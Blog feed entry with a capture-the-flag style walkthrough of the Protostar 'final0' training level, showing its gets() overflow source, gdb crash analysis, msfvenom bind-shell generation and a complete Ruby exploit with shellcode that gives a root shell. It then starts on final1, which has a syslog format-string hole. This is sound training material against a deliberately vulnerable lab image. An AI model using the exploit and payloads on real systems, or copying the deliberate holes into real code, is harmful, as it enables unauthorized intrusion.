<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[0x73696e65]]></title>
  <link href="http://73696e65.github.io/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-06T17:21:58+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Final Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels/"/>
    <updated>2015-07-06T08:14:11+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Final0</h2>

<figure class='code'><figcaption><span>final0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;final0&quot;</span>
</span><span class='line'><span class="cp">#define UID 0</span>
</span><span class='line'><span class="cp">#define GID 0</span>
</span><span class='line'><span class="cp">#define PORT 2995</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Read the username in from the network</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">get_username</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Strip off trailing new line characters */</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Convert to lower case */</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Duplicate the string and return it */</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No such user %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We attach to the process as root to find the offset with stored EIP.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -p 27474
</span><span class='line'>Attaching to process 27474
</span><span class='line'>...
</span><span class='line'>gdb> c
</span><span class='line'>[New process 27485]
</span><span class='line'>
</span><span class='line'># window2:
</span><span class='line'>user@protostar:/tmp$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A" | nc 0 2995
</span><span class='line'>
</span><span class='line'># window1:
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 27485]
</span><span class='line'>_______________________________________________________________________________
</span><span class='line'>     eax:0804B008 ebx:35724134  ecx:00000000  edx:00000001     eflags:00010286
</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF780  ebp:41367241     eip:72413772
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</span><span class='line'>[007B:BFFFF780]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF7B0 : 01 00 00 00  54 F8 FF BF - 5C F8 FF BF  48 18 FE B7 ....T...\...H...
</span><span class='line'>BFFFF7A0 : B0 98 04 08  00 00 00 00 - 28 F8 FF BF  76 DC EA B7 ........(...v...
</span><span class='line'>BFFFF790 : 65 63 EC B7  40 10 FF B7 - 04 00 00 00  F4 7F FD B7 ec..@...........
</span><span class='line'>BFFFF780 : 38 41 72 39  41 73 30 41 - 73 31 41 73  32 41 00 BF 8Ar9As0As1As2A..
</span><span class='line'>[007B:0804B008]---------------------------------------------------------[ data]
</span><span class='line'>0804B008 : 41 41 30 41  41 31 41 41 - 32 41 41 33  41 41 34 41 AA0AA1AA2AA3AA4A
</span><span class='line'>0804B018 : 41 35 41 41  36 41 41 37 - 41 41 38 41  41 39 41 42 A5AA6AA7AA8AA9AB
</span><span class='line'>[0073:72413772]---------------------------------------------------------[ code]
</span><span class='line'>0x72413772:   Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x72413772
</span><span class='line'>0x72413772 in ?? ()
</span><span class='line'>
</span><span class='line'># window2:
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772
</span><span class='line'>[*] Exact match at offset 532
</span><span class='line'>
</span><span class='line'># window1:
</span><span class='line'>gdb> i r
</span><span class='line'>eax            0x804b008  0x804b008
</span><span class='line'>ecx            0x0    0x0
</span><span class='line'>edx            0x1    0x1
</span><span class='line'>ebx            0x35724134 0x35724134
</span><span class='line'>esp            0xbffff780 0xbffff780
</span><span class='line'>ebp            0x41367241 0x41367241
</span><span class='line'>esi            0x0    0x0
</span><span class='line'>edi            0x0    0x0
</span><span class='line'>eip            0x72413772 0x72413772
</span><span class='line'>eflags         0x10286    [ PF SF IF RF ]
</span><span class='line'>cs             0x73   0x73
</span><span class='line'>ss             0x7b   0x7b
</span><span class='line'>ds             0x7b   0x7b
</span><span class='line'>es             0x7b   0x7b
</span><span class='line'>fs             0x0    0x0
</span><span class='line'>gs             0x33   0x33
</span><span class='line'>
</span><span class='line'>gdb> x /x 0x804b008
</span><span class='line'>0x804b008:    0x41304141
</span><span class='line'>gdb> x /s 0x804b008
</span><span class='line'>0x804b008:     "AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG"...</span></code></pre></td></tr></table></div></figure>


<p>So EAX points at the beginning to the buffer and we are lucky, because there is also <code>call eax</code> in binary.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0
</span><span class='line'>[final0]
</span><span class='line'>0x08048d5f call eax
</span><span class='line'>0x0804992b call eax
</span><span class='line'>0x08054f4b call eax
</span><span class='line'>0x08054f4b call eax</span></code></pre></td></tr></table></div></figure>


<p>We use <code>msfvenom</code> to generate bind shell, port <code>2449</code>, without newline characters and with uppercase encoding:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b '\x0a\x0d'
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
</span><span class='line'>x86/alpha_upper succeeded with size 224 (iteration=0)
</span><span class='line'>Payload size: 224 bytes
</span><span class='line'>???t$?[SYIIICCCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQYKL7JCQCQS1CSZTBK9KQNPCV8MK01K1N1B3XC2C0C9LQ2J4PF160K9KQCZ560X8MK0K91QTDH3DDX02F8MK0PC80RFHMMPZ3V9RJWOV8HMK0PIT9KHCX6OVOT3RHRHVOCRU9BNMYM30PPSLIKQNPDKXMK0AA</span></code></pre></td></tr></table></div></figure>


<p>The lower case <code>t</code> at the beginning of the payload is used in order to find the payload&rsquo;s absolute location in memory and obtain a position-independent shellcode,
more <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>.</p>

<p>Because we can refer to this position also with the register <code>eax</code>, we can get rid of lower case character:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b '\x0a\x0d' BufferRegister=EAX
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
</span><span class='line'>x86/alpha_upper succeeded with size 217 (iteration=0)
</span><span class='line'>Payload size: 217 bytes
</span><span class='line'>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIVQIKJWZC0SQS0S3Z4BK9M1X0CVHMMP1KQN1B3XER5P39J1RJTPV10PLIM1SZCVV88MMPMYW1S4H3ETH0BFHMMPPCNP3VHMK0MC69SZ7OF8XMMPW9BYKHSXFOFOSCSX3X6O52RI2NK9ZC0P63MYM1X04K8MMPAA</span></code></pre></td></tr></table></div></figure>


<p>Exploit:</p>

<figure class='code'><figcaption><span>language:ruby exploit-final0.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0 </span>
</span><span class='line'><span class="c1">#[final0]</span>
</span><span class='line'><span class="c1">#0x08048d5f call eax</span>
</span><span class='line'><span class="c1">#0x0804992b call eax</span>
</span><span class='line'><span class="c1">#0x08054f4b call eax</span>
</span><span class='line'><span class="c1">#0x08054f4b call eax</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772</span>
</span><span class='line'><span class="c1">#[*] Exact match at offset 532</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &#39;\x0a\x0d&#39; BufferRegister=EAX -f ruby</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x4a\x4a\x49\x36\x51\x49\x4b\x4c\x37\x4a\x43\x36\x33\x50</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x43\x56\x33\x43\x5a\x53\x32\x4d\x59\x4d\x31\x48\x30\x33</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x56\x58\x4d\x4d\x50\x31\x4b\x31\x4e\x31\x42\x42\x48\x54</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x42\x35\x50\x53\x39\x4a\x31\x32\x4a\x32\x30\x46\x31\x56</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x4c\x49\x4d\x31\x52\x4a\x42\x46\x30\x58\x58\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x4d\x59\x31\x51\x44\x44\x38\x33\x55\x54\x4e\x50\x32</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x46\x38\x4d\x4d\x50\x30\x43\x4e\x50\x45\x36\x38\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x5a\x33\x36\x39\x53\x5a\x47\x4f\x50\x58\x48\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x31\x59\x32\x59\x4a\x58\x45\x38\x36\x4f\x56\x4f\x32</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x53\x53\x58\x35\x38\x46\x4f\x45\x32\x53\x59\x32\x4e\x4d</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x59\x4a\x43\x36\x30\x56\x33\x4b\x39\x4d\x31\x58\x30\x44</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x4b\x58\x4d\x4b\x30\x41\x41</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">532</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="n">exploit</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x08048d5f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.154&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2995</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./exploit-final0.rb 
</span><span class='line'>Using host: 192.168.80.154
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ nc 0 2449
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Final1</h2>

<figure class='code'><figcaption><span>final1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;syslog.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;final1&quot;</span>
</span><span class='line'><span class="cp">#define UID 0</span>
</span><span class='line'><span class="cp">#define GID 0</span>
</span><span class='line'><span class="cp">#define PORT 2994</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">hostname</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">logit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&quot;Login from %s as [%s] with password [%s]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">pw</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">syslog</span><span class="p">(</span><span class="n">LOG_USER</span><span class="o">|</span><span class="n">LOG_DEBUG</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
